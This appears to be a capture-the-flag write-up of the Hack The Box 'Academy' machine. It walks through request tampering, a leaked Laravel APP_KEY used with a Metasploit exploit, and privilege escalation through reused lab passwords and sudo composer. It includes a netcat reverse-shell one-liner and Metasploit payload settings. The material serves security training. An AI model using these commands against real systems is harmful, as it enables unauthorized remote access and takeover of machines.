# <div align="center">![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/logo.png)</div>

------------------------------------------------------------------

> The best easy machine i've done so far, many things to do before getting root, it has been really amazing CTF to do ! I do recommand it, but few skills are needed

So after lauching the box we receive the ip address ```10.10.10.215```
No waste of time, let's jump in !

## 1 - Scouting before the attack

### A - Mapping :

First of all we need to map this IP, which means we need to see what this IP is linked to (it could be windows server/windows 7/linux machine etc), and which ports are open with services
So for that we use [NMAP](https://nmap.org/) which is a tool for network mapping superpowerfull and got the below result

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/nmap.png)

We can see SSH port is open on 22 and there's an http server open on port 80, so let's take a look.

### B - Taking around the web pages

We just spawn on the below page and got login page and register page links on the top right of the page

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/spawn.png)

Let's take a look at the register form first

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/registration.png)

And after login we arrive here

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/common-page.png)

We can notice the username isn't the same as it is mentioned on the page.
But anyway, after taking a look at the whole website we don't see any misconfiguration. So let's go deeper.

### C - Requests interceptions :

With [Burp Suite](https://portswigger.net/burp) we can intercept any requests and do whaterver we want with it. So i tried to intercept login post first and nothing interesting in it. But then i did the same with register and we got something interesting !

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/register-1.png)

We can see that the post request send something we didn't mentioned. The ```roleid``` value. And we got zero so let's change it to 1 and send the request 

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/register-2.png)


Now just login again 


### D - First missconfiguration :


![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/admin-panel.png)

Boom ! We got our first interesting information ! We even got a new subdomain url so let's take a look. 
First we need to add this subdomain to our hosts file (=local DNS file)

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/host-file.png)

Then let's go to the page

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/dev-staging-1.png)

We arrive on a Laravel error project. I intercept the get request and i received a 500 Internal Error. 
After checking the file we see many interesting things ! 
Most of it we got this: ```APP_KEY: "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="```
So now we know that we are on Laravel project, let's see if there is any exploits available for this

### E - Second missconfiguration :

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/searchsploit.png)

And we see something interesting ! A vulnerabiliy on the Laravel version 5.5 and 5.6 and we can exploit it using [Metasploit](https://www.metasploit.com/)
As i couldn't find the exact version of the website, i just tried the exploit

## 2 - Start the attack :

### A - Build the reverse-shell : 

We now have our entry point ! So let's attack this box !

I launch the Laravel exploit with metasploit console 

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/wrong-payload.png)

We can see by default the exploit launch a perl payload wich is not interesting for use because it's PHP exploit so let's change this and setup everything correctly
> $ ```set RHOST 10.10.10.215```
> 
> $ ```set VHOST dev-staging-01.academy.htb```
> 
> $ ```set LHOST tun0```  (our IP address)
> 
> $ ```set payload cmd/unix/reverse_php_ssl```
> 
> $ ```set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=```

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/good-msf.png)

Now we can run the exploit 

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/partial-shell.png)

### B - Get an Interactive shell : 

We got a shell ! It look like it a partial one but still ! 
So let's fix this using a trick 
```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MY_IP_ADR LOCAL_PORT \>/tmp/f```
And on our side we just run ```nc -lnvp LOCAL_PORT```
LOCAL_PORT means the port we want to listen on.

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/fix-www-data.png)

Now we receive an iteractive shell ! So we can go almost everywhere on the server
So first i tryied to enumerate after dowloading the below tool but i didn't get any info because www-data is low priv user

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/upload-linpeas.png)

After a long time trying to find a way for privilege escalation i just started to look at simple files. In the /var/www/html folder there were another Laravel project. So i just take a look at the .env file and found this

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/db-creds.png)

It's a DB_USERNAME and DB_PASSWORD !
I trying to connect to mysql with those creds but it didn't work. Maybe it's a user credentials ? 

As i've seen in the /home folder, there's planty of users. I just tried to connect to them with the password i found using ssh.

### C - First Privilege escalation : 

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/ssh-login.png)

So ```mySup3rP4s5w0rd!!``` is finnaly the password for cry0l1t3 user ! 
And as we connect with ssh we have a 100% interactive shell wich is amazing for the next steps.


So as i already upload on the server our [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) script, i take a look at the result and see this

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/find-new-passwd.png)

A user trying to connect to ```mrb3n``` account put his password on the shell like so: ```su "mrb3n_Ac@d3my!"```

So now we switch to his account and take a look at his sudo rights

### D - Second Privilege escalation : 
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/switch-user.png)

It looks like mrb3n can execute composer with root privilege ! 
I just google 'privilege escalation composer' and take the first link.
[GTFObins](https://gtfobins.github.io/gtfobins/composer/)

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/gtfobins.png) 

### E - Last Privilege escalation : 

I then just ran the commands, and then get root !

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Academy/rooted.png)
